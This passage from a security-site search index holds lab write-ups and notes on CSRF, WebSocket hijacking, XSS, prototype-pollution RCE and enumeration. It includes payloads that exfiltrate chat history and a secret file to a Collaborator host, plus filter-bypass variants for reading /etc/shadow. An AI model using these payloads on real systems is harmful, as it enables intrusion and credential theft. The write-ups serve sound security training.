cookies work more as a session identifier than an anti-CSRF token; they are just like adding two session IDs. Request restrictions: Some developers limit the type of request received by the application to just accept POST requests, but, it is entirely possible to exploit a CSRF using POST requests. Complex flow: Some developers create complex application flows to avoid these kinds of attacks, like confirming critical actions. We just need to understand how the process works using an HTTP proxy, not automating the attack in the same way as the others. URL rewriting: To confuse the attackers, some developers rewrite the URLs used in the request, or use named magic URLs, which are URLs rewritten to be shorter and look better when you are managing long paths. And, as all the information is sent into the request, the attacker can just copy and use the same information to perform the attack. Using HTTPS instead of HTTP: To protect the request, sometimes, HTTP is used. Never mind, because the Proxy intercepts all the information. CSRF - more safe protection  Form keys: A key included in each request to a URL; so, if a malicious user sent a repeated key, the application would avoid the attack. Hashes: It is possible to add hashes for sessions, methods, keys, and so on. View state: .NET has implemented a control and named view state, that tracks the user session, but it includes a specific control to avoid manipulation, and also a hash to protect it. Referer: The HTTP requests have a header known as referer. You can use it to prevent requests from unexpected sites. However, do not trust a lot on it. Anything can be modified from the client side. Tokens: The most extended security control to avoid CSRF is the use of tokens. These are usually hashed identifiers that can also include secret data, such as the referer information, to protect the requests. Referer headers can be manipulated by attackers and aren’t a foolproof mitigation solution. Developers should implement a combination of CSRF tokens and SameSite session cookies for the best protection. Bypassing protections  If the protection used is incomplete or faulty, you might still be able to achieve a CSRF attack with a few modifications to the payload. Create CSRF templates to automate the exploitation to confirm the vulnerabilities. <form method='POST' action='http://targetsite.com/form.php'> <input type='hidden' name='criticaltoggle' value='true' <input type='submit' value='submit'> </form> If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking , you can exploit clickjacking to achieve the same results as a CSRF, because clickjacking uses an iframe to frame the page in a malicious site while having the state-changing request originate from the legitimate site. Change the request method: Sometimes sites will accept multiple request methods for the same endpoint, and protection might not be in place for another method. Bypass CSRF tokens stored on the server: Just because a site uses CSRF tokens does not mean it is validating them properly. Try deleting the token parameter or sending a blank token parameter. Deleting the token parameter or sending a blank token often works because of a common application logic mistake. Applications sometimes check the validity of the token only if the token exists, or if the token parameter is not blank. Some applications might check only whether the token is valid, without confirming that it belongs to the current user. If this is the case, you can insert your own CSRF token into the malicious request. Bypass double-submit CSRF tokens: In double-submit cookie as a defense against CSRF, the state-changing request contains the same random token as cookie and request parameter, and the server checks whether the two values are equal. If the values match, the request is seen as legitimate. Nomnomnom. In a double-submit token validation system, it does not matter whether the tokens themselves are valid, and the application is probably not keeping records of the valid tokens server-side. If it did, it wouldn’t use this scheme. Bypass CSRF Referer Header check: If the target site is not using CSRF tokens, the server might verify that the referer header sent with the state-changing request is a part of the website’s allowlisted_domains . Sometimes, all you need to do to bypass a referer check is to not send a referer at all. To remove the referer header, add a meta tag to the page hosting the request form. What if the application looks for the string “example.com” in the referer URL, and if the referer URL contains that string, the application treats the request as legitimate. Otherwise, it rejects the request? In this case, you can bypass the referer check by placing the victim domain name in the referer URL as a subdomain. You can achieve this by creating a subdomain named after the victim’s domain, and then hosting the malicious HTML on that subdomain. Or try placing the victim domain name in the referer URL as a pathname. Using XSS as helper: In some cases an application an anti-CSRF protection and is well-implemented, but it is possible to defeat the anti-CSRF...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "34d0e27dda0266da655089405c90649b",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/9",
    "t": "SameSite Strict bypass via sibling domain ",
    "c": "SameSite Strict bypass via sibling domain  Description  This lab ’s live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH) . Reproduction and proof of concept  Study the live chat feature  In Burp’s browser, go to the live chat feature and send a few messages. In Burp, go to the Proxy -> HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request. Notice that this doesn’t contain any unpredictable tokens, so it may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions. In the browser, refresh the live chat page. In Burp, go to the Proxy -> WebSockets history tab. When refreshing the page, the browser sends a READY message to the server. This causes the server to respond with the entire chat history. Confirm the CSWSH vulnerability  In Burp, go to the Collaborator tab and click Copy to clipboard . In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept: <script> var ws = new WebSocket('wss://0add0076049f4a6fc1b319b700a00066.web-security-academy.net/chat'); ws.onopen = function() { ws.send(\"READY\"); }; ws.onmessage = function(event) { fetch('https://0yzg09yhcj2i5tf7f8z1wmsq1h78vyjn.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script> Store and view the exploit . In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you’ve opened a new live chat connection with the target site. Notice that although you’ve confirmed the CSWSH vulnerability, you’ve only exfiltrated the chat history for a brand-new session, which isn’t particularly useful. Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by the script. This should be the most recent GET /chat request. Notice that your session cookie was not sent with the request. In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests. Identify an additional vulnerability in the same “site”  In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net . In the browser, visit this new URL to discover an additional login form. Submit some arbitrary login credentials and observe that the username is reflected in the response in the Invalid username message. Try injecting an XSS payload via the username parameter, for example: <script>alert(1)</script> Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector. Send the POST /login request containing the XSS payload to Burp Repeater. In Burp Repeater, right-click on the request and select Change request method to convert the method to GET . Confirm that it still receives the same response. Right-click on the request again and select Copy URL . Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions. Bypass the SameSite restrictions  Recreate the CSWSH script tested on the exploit server earlier. URL encode the entire script: %3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%64%64%30%30%37%36%30%34%39%66%34%61%36%66%63%31%62%33%31%39%62%37%30%30%61%30%30%30%36%36%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6f%79%71%34%30%78%79%35%63%37%32%36%35%68%66%76%66%77%7a%70%77%61%73%65%31%35%37%77%76%6f%6a%64%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e Go back to the exploit server and create a script that induces the viewer’s browser to send the GET request just tested, but use the URL-encoded CSWSH payload as the username parameter, for example: <script> document.location = \"https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything\"; </script> Store and view the exploit. In Burp, go back to the Collaborator tab and click Poll now. Observe that you’ve received a number of new interactions, which contain your entire chat history. Go to the Proxy -> HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request. Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request. Deliver the exploit chain  Go back to the exploit server and deliver the exploit to the victim. In Burp, go back to the Collaborator tab and click Poll now. Observe that you’ve received a number of new interactions. Study the HTTP interactions and notice that these contain the victim’s chat history. Find a message containing the victim’s username and password. Use the newly obtained credentials to log in to the victim’s account and the lab is solved. Exploitability  An attacker needs to use an exploit server to perform a CSWSH attack that exfiltrates the victim’s chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e5afbd8978c1b4216987b9971f842833",
    "u": "https://webapp.tymyrddin.dev/docs/xss/21",
    "t": "Reflected XSS into a JavaScript string with single quote and backslash escaped ",
    "c": "Reflected XSS into a JavaScript string with single quote and backslash escaped  Description  The website in this lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped. Reproduction and proof of concept  Enter a random alphanumeric string in the search box, then use Burp to intercept the search request and send it to Burp Repeater. Note the random string has been reflected inside a JavaScript string. Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. Replace the input with the following payload to break out of the script block and inject a new script: </script><script>alert(1)</script> Verify the technique worked by right-clicking, selecting “Copy URL”, and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0263bdc22cf2c9024b09684bc20a6cd0",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/10",
    "t": "Exfiltrating sensitive data via server-side prototype pollution ",
    "c": "Exfiltrating sensitive data via server-side prototype pollution  This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. Due to the configuration of the server, it’s possible to pollute Object.prototype in such a way that it is possible to inject arbitrary system commands that are executed on the server. Reproduction and PoCs  Study the address change feature  Log in with wiener:peter and visit the account page. Submit the form for updating your billing and delivery address. In Burp, go to the Proxy -> HTTP history tab and find the POST /my-account/change-address request. When submitting the form, the data from the fields is sent to the server as JSON. The server responds with a JSON object that appears to represent your user. This has been updated to reflect the new address information. Send the request to Burp Repeater. Identify a prototype pollution source  In Repeater, add a new property to the JSON with the name __proto__ , containing an object with a json spaces property. \"__proto__\": { \"json spaces\":10 } Send the request. In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype. Probe for remote code execution  Go to the admin panel and observe that there’s a button for running maintenance jobs. Click the button and observe that this triggers background tasks that cleanup the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes. Try polluting the prototype with a set of malicious properties that control the options passed to the child_process.execSync() method. The injected command should trigger an interaction with the public Burp Collaborator server: \"__proto__\": { \"shell\":\"vim\", \"input\":\":! curl https://uywkxrh5o7yl6c9iauwoewp6xx3orff4.oastify.com\\n\" } Send the request. In the browser, go to the admin panel and trigger the maintenance jobs. After a short delay, these fail to run. In Burp, go to the Collaborator tab and poll for interactions. Observe that you have received several interactions. This confirms the remote code execution. Leak the hidden file name  In Burp Repeater, modify the payload in your malicious input parameter to a command that leaks the contents of Carlos’s home directory to the public Burp Collaborator server. The following is one approach for doing this: ```text \"__proto__\": { \"shell\":\"vim\", \"input\":\":! ls /home/carlos | base64 | curl -d @- https://uywkxrh5o7yl6c9iauwoewp6xx3orff4.oastify.com\\n\" } Send the request. In the browser, go to the admin panel and trigger the maintenance jobs again. Go to the Collaborator tab and poll for interactions. Notice that you have received a new HTTP POST request with a Base64-encoded body. Decode the contents of the body to reveal the names of two entries: node_apps and secret . Exfiltrate the contents of the secret file  In Burp Repeater, modify the payload in your malicious input parameter to a command that exfiltrates the contents of the file /home/carlos/secret to the public Burp Collaborator server. The following is one approach for doing this: \"input\":\":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\\n\" Send the request. In the browser, go to the admin panel and trigger the maintenance jobs again. Go to the Collaborator tab and poll for interactions. Notice that you have received a new HTTP POST request with a Base64-encoded body. Decode the contents of the body to reveal the secret. In browser, go to the lab banner and click Submit solution . Enter the decoded secret to solve the lab. Exploitability  To solve the lab: An attacker will need to already have escalated privileges, giving access to admin functionality; find a prototype pollution source that can be used to add arbitrary properties to the global Object.prototype ; identify a gadget that can be used to inject and execute arbitrary system commands; trigger remote execution of a command that leaks the contents of Carlos’s home directory ( /home/carlos ) to the public Burp Collaborator server; exfiltrate the contents of a secret file in this directory to the public Burp Collaborator server; and submit the secret obtained from the file using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7b04ad945cfa284b27248001bb87ae23",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/rce",
    "t": "Remote code execution (RCE) ",
    "c": "Remote code execution (RCE)  Remote code execution (RCE) occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration. RCEs are extremely dangerous, as attackers can often ultimately compromise the web application or even the underlying web server. This control can be used further in several ways, including lateral movement through the internal network using the trust the target server has with other systems on the network. It is often not obvious which, if any, inputs might influence command-line execution. Common vulnerabilities to look for that can lead to a command injection attack: Applications may enable users to run arbitrary commands, and run these commands as is to the underlying host. An application may allow users to upload files with arbitrary file extensions, these files could include malicious commands. On most web servers, placing such files in the webroot will result in command injection. Insecure serialization : If deserialization is performed without proper verification, it can result in command injection. Server-side template injection (SSTI) : If applications use server-side templates to generate dynamic HTML responses, it may be possible to insert malicious server-side templates. XML external entity injection (XXE) occurs in applications that use a poorly-configured XML parser to parse user-controlled XML input. This vulnerability can cause exposure of sensitive data, server-side request forgery (SSRF) , or denial of service attacks. Many pentesters, red teamers and bounty hunters aim to find command injection vulnerabilities due to the impact they can have. Steps  Gather information about the target. Identify suspicious user-input locations. For code injections, take note of every user-input location, including URL parameters, HTTP headers, body parameters, and file uploads. To find potential file inclusion vulnerabilities, check for input locations being used to determine or construct filenames and for file-upload functions. Try test payloads to the input locations in order to detect potential vulnerabilities. If requests are blocked, try protection-bypass techniques and see if the payload succeeds. Confirm the vulnerability by trying to execute harmless commands such as whoami , ls , and sleep 5 . Avoid reading sensitive system files or altering any files with the vulnerability found. Draft report. Gather information about the target  The first step to finding any vulnerability is to gather information about the target. When hunting for RCEs, this step is especially important because the route to achieving an RCE is extremely dependent on the way the target is built. Find out information about the web server, programming language, and other technologies used by your current target. These will allow focusing the attacks on using payloads with the proper syntax. Identify suspicious user input locations  As with finding many other vulnerabilities, the next step to finding any RCE is to identify the locations where users can submit input to the application. When hunting for code injections, take note of every direct user-input location, including URL parameters, HTTP headers, body parameters, and file uploads. Sometimes applications parse user-supplied files and concatenate their contents unsafely into executed code, so any input that is eventually passed into commands is something you should look out for. To find potential file inclusion vulnerabilities, check for input locations being used to determine filenames or paths, as well as any file-upload functionalities in the application. Submit test payloads  The next thing is to submit test payloads to the application. Use payloads that are meant to be interpreted by the server as code and see if they get executed. Because the actual command being influenced by an input is often obfuscated, try a variety of payloads to increase the odds that something will result in a noticeable behaviour that indicates successful injection. Try: Filenames URLs Statement termination and comments Filename wildcards, redirection, substitution, and pipelines Include blind tests as malicious payloads for: Invocations of programs that cause a measurable delay in application such as sleep and ping . Invocations of programs that have discernible impact outside the server such as ping , netcat , and curl . Confirm the vulnerability  Finally, confirm the vulnerability by executing harmless commands like whoami , ls , and sleep 5 . Bypassing protections  Many applications have caught on to the dangers of RCE and employ either input validation or a firewall to stop potentially malicious requests. But programming languages are often quite flexible, and that enables us to work within the bounds of the input validation rules to make our attack work. For Unix system commands, you can insert quotes and double quotes without changing the command’s behaviour. You can also use wildcards to substitute for arbitrary characters if the system is filtering out certain strings. And any empty command substitution results can be inserted into the string without changing the results. For example, these will all print the contents of /etc/shadow : cat /etc/shadow cat \"/e\"tc'/shadow' cat /etc/sh*dow cat /etc/sha``dow cat /etc/sha$()dow cat /etc/sha${}dow You can hex-encode, URL-encode, double-URL-encode, and vary the cases (uppercase or lowercase characters) of payloads. You can try to insert special characters such as null bytes, newline characters, escape characters ( \\ ), and other special or non-ASCII characters into the payload. Then, observe which payloads are blocked and which ones succeed, and craft exploits that will bypass the filter to accomplish the desired results. Escalation  Be extra cautious when escalating RCE vulnerabilities. Most companies would prefer that you do not try to escalate them at all because they do not want someone poking around systems that contain confidential data. During a typical penetration test, a hacker will often try to figure out the privileges of the current user and attempt privilege-escalation attacks after they gain RCE. In a bug bounty context, this is not appropriate. You might accidentally read sensitive information about customers or cause damage to the systems by modifying a critical file. It is important to carefully read the bounty program rules, so you do not cross the lines. For classic RCEs, create a proof of concept that executes a harmless command like whoami or ls . You can also prove to have found an RCE by reading a common system file such as /etc/passwd . Portswigger lab writeups  OS command injection, simple case Blind OS command injection with time delays Blind OS command injection with output redirection Blind OS command injection with out-of-band interaction Blind OS command injection with out-of-band data exfiltration Remediation  Avoid system calls and user input in applications where possible. Set up input validation. Create a white list of possible inputs, to make sure the system accepts only pre-approved inputs. Use only secure APIs when executing system commands such as execFile() . Prevent users from gaining control over the name of the program and map user input to command arguments to prevent user input being passed as-is into program execution. Resources  Portswigger Lab: Remote code execution via web shell upload OWASP Command Injection Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cfeaea289a0f4fb49ef8e455286cfe4b",
    "u": "https://enum.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Application scanning tools can be used to perform an audit on an application. There are basically two types of application audit tools: A dynamic analysis tool assesses vulnerabilities in an application by analysing the behaviour of the application while it is running (how it responds to input). The best is a combination of scanning and using scanners like Zap and Burp in a manual walkthrough. In a static analysis, the source code is reviewed for vulnerabilities. Can be done manually or using an automated vulnerability scanner. Use both for manual and automated scanning of the application. Why?  Move further and deeper into the scanning process to include security scanning and discover vulnerabilities to exploit. How?  Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "098c1e5cdd78323ada26496c43d9d2ee",
    "u": "https://enum.tymyrddin.dev/docs/system/dns",
    "t": "DNS enumeration ",
    "c": "DNS enumeration  DNS enumeration is possible by sending zone transfer requests to the DNS primary server pretending to be a client. DNS enumerating reveals sensitive domain records in response to the request. Tools  DNS enumeration tools Remediation  Configure DNS servers not to send DNS zone transfers to unauthenticated hosts. Make sure DNS zone transfers do not contain HINFO information. Trim DNS zone files to prevent revealing unnecessary information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc1c5a6c57ac8af2512aff5d7735c05d",
    "u": "https://enum.tymyrddin.dev/docs/app/api",
    "t": "Scanning an API ",
    "c": "Scanning an API  There are two main architectural styles used in modern APIs: SOAP: a highly structured message protocol that supports multiple low-level protocols. REST: a simpler approach to APIs using HTTP/S as the transport protocol, and typically using JSON format for data transfer. Both types of APIs support HTTP requests and responses and Secure Sockets Layer (SSL), but the similarity ends there. The increase of API-related security threats in recent years has prompted the Open Web Application Security Project (OWASP) to release the API Security Top 10, which helps raise awareness of the most serious API security issues affecting organizations. Use either the ZAP-API Scan or Burp API scan . Resources  OWASP API Security Project",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a024b71865d68290052537f1448d20b6",
    "u": "https://enum.tymyrddin.dev/docs/app/automated",
    "t": "Automated vulnerability scanning ",
    "c": "Automated vulnerability scanning  Pros and cons of using Automated vulnerability scanners : Advantages  Automated scans are easy to repeat, and the results can be shared within a team with ease. These scanners are quick and can test numerous applications efficiently. Open-source solutions exist. Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. Disadvantages  People can often become reliant on these tools. They are extremely “loud” and produce a lot of traffic and logging. This is not good if you are trying to bypass security controls. Open-source solutions are often basic and require expensive licenses to have useful features. They often do not find every vulnerability on an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "af269ce6c0ea692e34a159f21705ac1e",
    "u": "https://enum.tymyrddin.dev/docs/system/snmp",
    "t": "SNMP enumeration ",
    "c": "SNMP enumeration  Default SNMP passwords allow attackers to view or modify the SNMP configuration settings. Attackers can enumerate SNMP on remote network devices for: Information about network resources such as routers, shares, devices, etc. ARP and routing tables Device specific information Traffic statistics And more. Tools  SNMP enumeration tools Remediation  Minimize the attack surface by removing the SNMP agents where not needed. Change default public community strings. Upgrade to SNMPv3, which encrypts the community strings and messages. Implement group policy for additional restriction on anonymous connections. Implement firewalls to restrict unnecessary connections. Implement IPSec filtering. Block access to TCP/UDP ports 161. Encrypt and authenticate using IPSEC.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1f26fd1b6a07d6de4a8e205edf448574",
    "u": "https://enum.tymyrddin.dev/docs/overview",
    "t": "Enumeration overview ",
    "c": "Enumeration overview  Enumerate hosts on the network using Zenmap. Zenmap is a version of Nmap that has a graphical interface. Use Zenmap to create a network topology to help identify the network layout. Try to enumerate users and groups. Try to get a list of SMB shares on the system. Enumerate uniform resource locators (URLs) and retrieve any web pages. Identifying the software running on a system can be tricky. Get creative. For example, use Ncrack to do a dictionary attack on the administrator account and then supply that as the credentials to a script to see a list of the processes running on that system. Get lists of services running on a system by performing an nmap scan. Try to obtain security tokens. Enumerate social media posts by a user with a given IP address by using a tool like recon-ng . A full scan does a variety of tests to identify vulnerabilities in the system. For example, Nessus can be set to use a number of plug-ins such as for checking for security issues with Simple Mail Transfer Protocol (SMTP) and Simple Network Management Protocol (SNMP) services, checking for Linux security issues, and checking for web server and Windows vulnerabilities, etc. Such scans are considered to be aggressive. If red teaming or hired to do a penetration test where the security team is not informed of our presence, we can do a stealth scan and are to put more effort into choosing specific scanning techniques to avoid detection by the blue/security team, for example by not scanning the full IP range sequentially, or scanning ports sequentially, and by using multiple source IP addresses to scan from. Compliance scanning by externals has its own rules and requirements. For example, for compliance with the Payment Card Industry Data Security Standard (PCI DSS) standards, these include: Both internal and external scans must be performed. External scans must be approved by an approved scanning vendor (ASV). Vulnerability scans are to be done quarterly and after any major change to the environment. If critical vulnerabilities are found, they must be remediated and then a new scan done to validate the remediation steps have removed the vulnerability. When doing a vulnerability scan on target systems, do it multiple times, as an anonymous, non-credentialed user, and as a credentialed user with and without administrative credentials. As a non-credentialed user we are not to see information such as the password policies configured, group membership, and other configuration settings. As a credentialed user with an administrative account, we may get information about the configuration of the system including vulnerabilities related to user accounts (for example an account called “administrator” or “admin”) and group membership (too many users in the administrators group), missing patches, and password policy configuration settings.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ea87b6ea64a6f9ab6b5d2083ad091f52",
    "u": "https://enum.tymyrddin.dev/docs/system/netbios",
    "t": "NetBios enumeration ",
    "c": "NetBios enumeration  NetBIOS is outdated but still lives on in some older systems, sometimes for backward compatability. It is the equivalent of broadcasting names to look for each other but is not routable. It is local network only. If no one on the other network can use it for your network, then no one there can access your NetBIOS shared folders and printers, unless one has gained access to your local network. You can also access NetBIOS machines with a WINS server. That is the NetBIOS equivalent of a DNS server. NetBIOS software runs on port 139 on the Windows operating system. File and printer services need to be enabled to enumerate NetBIOS over Windows. An attacker can perform the following on the remote machine: Choosing to read or write to a remote machine, depending on the availability of shares. Launching a Denial of Service (DoS) attack on the remote machine. Enumerating password policies on the remote machine. Tools  NetBios enumeration tools Remediation  Minimise the attack surface by minimising the unnecessary service like Server Message Block (SMB). Remove file and printer sharing in Windows OS.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "454ff8ca59627211003a08a68be3a771",
    "u": "https://enum.tymyrddin.dev/docs/vulns/mapping",
    "t": "Mapping vulnerabilities to exploits ",
    "c": "Mapping vulnerabilities to exploits  Attack tree  1 List and score exploitable vulnerabilities 1.1 by Common Vulnerability Scoring System (CVSS) (OR) 1.1.1 Calculate Exploitability 1.1.2 Calculate Impact 1.1.3 f(Impact) 1.1.4 BaseScore 1.2 by Vulnerability Priority Rating (VPR) 2 Prioritisation possibilities 2.1 Severity level 2.2 Vulnerability exposure 2.3 Criticality Common Vulnerability Scoring System (CVSS)  The Common Vulnerability Scoring System (CVSS) is a standard vulnerability scoring system used by vulnerability scanners to identify the severity of the vulnerability. A CVSS base score can be a number from 0 to 10, with 0 being the least severe, and 10 being the most severe. The format of the base score for CVSS2: CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C Three metrics are used to calculate the exploitability of a vulnerability: The access vector (AV), used to measure how the hacker executes the exploit. Does she have to have physical access to the system, be in an adjacent network and use pivoting, or is the vulnerability exploitable from a remote network? The attack complexity (AC), to describe how easy or difficult it is to exploit the vulnerability. Authentication (Au), used to specify how many times she would need to authenticate to exploit the vulnerability. Exploitability = 20 * AV * AC * Au Impact metrics are used to identify what the impact of the exploit is on the confidentiality (C), integrity (I), and availability (A) of systems and their data. The values can be None (N), Partial (P) or Complete (C) Impact = 10.41 * (1-(1-C)*(1-I)*(1-A)) f(Impact) = 0 if Impact = 0, 1.176 otherwise. End score: BaseScore = roundToOneDecimal(( (0.6*Impact) + (0.4*Exploitability)-1.5) * f(Impact)) Vulnerability Priority Rating (VPR)  The VPR framework is a more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS). Unlike CVSS, VPR scoring takes into account the relevancy of a vulnerability. For example, no risk is considered regarding a vulnerability if that vulnerability does not apply to the organisation. VPR is also considerably dynamic in its scoring, where the risk that a vulnerability may pose can change almost daily as it ages. VPR uses a similar scoring range as CVSS. Two notable differences are that VPR does not have a None/Informational category, and because VPR uses a different scoring method (youtube) , the same vulnerability will have a different score using VPR than when using CVSS. Nessus  In Nessus, the Vulnerability Information includes whether known exploits are available for a vulnerability. The section labeled “Exploitable With” even shows what tools can be used to exploit the vulnerability. Real Risk Score (RRS)  Real Risk Score (RRS) not only takes into account the equation behind the CVSS of each vulnerability, but also the Metasploit modules that could be launched against it, the malware kits detected, and even how old the vulnerability is. Resources  NVD CVSS v2 Calculator NVD CVSS v3 Calculator Vulnerability Priority Rating (VPR) Summary Real Risk Score",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "275316b5407eae7e98bb36d23e19b8a5",
    "u": "https://enum.tymyrddin.dev/docs/vulns/prioritisation",
    "t": "Prioritisation of vulnerabilities ",
    "c": "Prioritisation of vulnerabilities  Asset categorisation — how critical is the system that has vulnerabilities? Adjudication — making a decision on whether the vulnerability discovered is a false positive. Review and validate. Prioritisation of vulnerabilities — if a vulnerability exploits confidentiality, integrity, or availability, then that vulnerability would typically take priority. Common Vulnerability Scoring System (CVSS)  Advantages  CVSS has been around for a long time. CVSS is popular in organisations. CVSS is a free framework to adopt and recommended by organisations such as NIST. Disadvantages  CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity. CVSS heavily assesses vulnerabilities on an exploit being available. Only 20% of all vulnerabilities have an exploit available ( Tenable., 2020 ). Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found. Vulnerability Priority Rating (VPR)  Advantages  VPR is a modern framework that is real-world. VPR considers over 150 factors when calculating risk. VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities. Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages. Disadvantages  VPR is not open-source like some other vulnerability management frameworks. VPR can only be adopted separate from a commercial platform. VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR. Real Risk Score (RRS)  Real Risk Score (RRS) may offer a good alternative. It enriches CVSS data to provide a more precise risk score.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f9f57e43799169b1563d26179028d219",
    "u": "https://enum.tymyrddin.dev/docs/app/scanning",
    "t": "Dynamic web application scanning ",
    "c": "Dynamic web application scanning  Features of the two main web application scanners (community versions): Feature Burp Suite Community Edition OWASP ZAP Burp Suite Pro Web Application Scanning Not Available Available with basic security vulnerabilities Available with quality security vulnerabilities Intercepting Feature Available Available Available Fuzzing Capabilities Available Available Available Encoder and Decoder Available Not Available Available Cost Free Free Paid Subscription Advanced Functionality ($450 per year) Documentation Extensive Little Extensive Spider Available Available Available Updates Available Available Available Extensions Less Options No provision for enhance functionality Available Coverage Medium coverage Less coverage Extensive Coverage False Positive Less More Less Session Token Entropy Analysis Available Not Available Available Comparison Feature Available Not Available Available",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d60a0f3306d489a4438058abb064816a",
    "u": "https://enum.tymyrddin.dev/docs/vulns/more",
    "t": "Discovering more vulnerabilities/exploits ",
    "c": "Discovering more vulnerabilities/exploits  Attack tree  1 Known vulnerabilities/exploits (AND) 1.1 Look up in Exploit databases 1.2 Vulnerability scanning 2 Latent vulnerabilities (AND) 2.1 Security code reviews 2.2 Specific code scanning for vulnerabilities 3 New vulnerabilities 3.1 Root cause analysis 3.2 Variant analysis 3.3 Patch analysis 3.4 Exploit technique analysis 4 New exploits 4.1 Proof-of-concept development (exploit development) 4.2 Cross-compiling 4.3 Modifying an existing exploit 4.4 A new exploit chain (a new on-path) Notes  Manual security code reviews  Manual security code reviews are usually performed by developers or security experts. Such efforts usually take place during a security push or pentesting engagement and are associated with a final security review. Coding errors can be found using different approaches, but even when compared to sophisticated tools, manual code reviews have clearly proven their value in the areas of precision and quality. Unfortunately, manual code reviews are also the most expensive to execute. It is important the developers are not part of the team that created the code, and a facilitator/security professional is also a good idea. New vulnerabilities  New vulnerabilities are usually found through bug bounty programs, or researched by dedicated groups like Google Project Zero. New exploits  Developing your own exploit is a great way to demonstrate proof of concept that the exploit can happen without focusing on performing malicious activity on the target system. Cross-compiling by downloading the source code of an existing exploit and compiling it for another platform. Modifying the exploit to fit your needs before compiling the exploit is also a good option. Exploit chaining uses a combination of different exploits run one after the other. Resources known vulnerabilities  0-days In-the-Wild Blackhat 2020: Reversing the Root (pdf of slides)",
